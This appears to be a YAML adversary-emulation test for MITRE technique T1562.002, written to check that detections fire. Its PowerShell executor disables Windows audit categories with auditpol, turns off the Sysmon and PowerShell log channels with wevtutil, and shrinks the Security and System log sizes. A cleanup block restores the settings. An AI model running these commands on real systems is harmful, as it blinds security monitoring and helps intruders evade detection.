id: T1562.002
name: Disable Windows Event Logging
description: Disables audit categories via auditpol (generates EID 4719 — the primary detection event), disables log channels via wevtutil /e:false (used by real malware to blind Sysmon before lateral movement), and reduces log sizes via registry. Saves backup before modifying and fully restores on cleanup.
tactic: defense-evasion
technique_id: T1562.002
platform: windows
phase: attack
elevation_required: true
expected_events:
  - event_id: 4719
    channel: "Security"
    description: "System audit policy changed — fires when auditpol disables a category"
  - event_id: 4688
    channel: "Security"
    description: "auditpol.exe with /set /category ... /success:disable"
  - event_id: 13
    channel: "Microsoft-Windows-Sysmon/Operational"
    description: "RegistryValueSet — EventLog MaxSize reduction"
tags:
  - defense-evasion
  - requires-elevation
siem_coverage:
  crowdstrike:
    - "Suspicious Scripts and Commands"
executor:
  type: powershell
  command: |-
    Write-Host "[T1562.002] Disable Windows Event Logging"

    # Backup audit policy first
    $backupFile = "$env:TEMP\lnj_auditpol_backup.csv"
    auditpol /backup /file:$backupFile 2>&1 | Write-Host
    Write-Host "Audit policy backed up to $backupFile"

    # Method 1: auditpol — disable key categories (generates EID 4719 per category)
    Write-Host "--- Method 1: auditpol disable (EID 4719 per modified category) ---"
    auditpol /set /category:"Account Logon" /success:disable /failure:disable 2>&1 | Write-Host
    auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable 2>&1 | Write-Host
    auditpol /set /category:"Detailed Tracking" /success:disable /failure:disable 2>&1 | Write-Host
    Write-Host "EID 4719 fired for each disabled category"

    # Method 2: wevtutil sl /e:false — blind Sysmon and PowerShell channels
    # Real malware uses this before lateral movement to stop event generation
    Write-Host "--- Method 2: wevtutil disable channels (Sysmon + PowerShell) ---"
    wevtutil sl "Microsoft-Windows-Sysmon/Operational" /e:false 2>&1 | Write-Host
    wevtutil sl "Windows PowerShell" /e:false 2>&1 | Write-Host
    wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:false 2>&1 | Write-Host

    # Method 3: Registry log size reduction (overwrites quickly — 1MB vs default 20MB)
    Write-Host "--- Method 3: Registry EventLog MaxSize reduction (Sysmon EID 13) ---"
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security" -Name "MaxSize" -Value 1048576 -Type DWord
    Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\System" -Name "MaxSize" -Value 1048576 -Type DWord
    Write-Host "Log sizes set to 1MB — events overwritten very quickly"

    Write-Host "[T1562.002] Complete. EID 4719 fired. Cleanup RESTORES all settings."
cleanup: |-
  $backupFile = "$env:TEMP\lnj_auditpol_backup.csv"
  if (Test-Path $backupFile) {
      auditpol /restore /file:$backupFile 2>&1 | Out-Null
      Remove-Item $backupFile -Force
  }
  wevtutil sl "Microsoft-Windows-Sysmon/Operational" /e:true 2>&1 | Out-Null
  wevtutil sl "Windows PowerShell" /e:true 2>&1 | Out-Null
  wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:true 2>&1 | Out-Null
  Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\Security" -Name "MaxSize" -Value 20971520 -Type DWord -EA Ignore
  Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\System"   -Name "MaxSize" -Value 20971520 -Type DWord -EA Ignore
  Write-Host "Cleanup: Audit policy restored; log channels re-enabled; log sizes restored to 20MB."
